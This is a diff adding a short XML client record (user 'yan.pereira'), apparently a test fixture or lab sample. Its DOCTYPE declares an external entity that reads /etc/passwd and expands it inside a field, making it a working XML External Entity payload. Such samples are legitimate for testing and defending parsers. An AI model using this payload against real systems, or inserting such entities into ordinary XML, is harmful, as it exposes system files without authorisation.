@@ -1,0 +1,9 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE client [ <!ENTITY xxe SYSTEM "file:////etc/passwd"> ]>
+<client>
+    <username>yan.pereira</username>
+    <name>Yan</name>
+    <lastname>Pereira</lastname>
+    <score>100</score>
+    <foo>&xxe;</foo>
+</client>
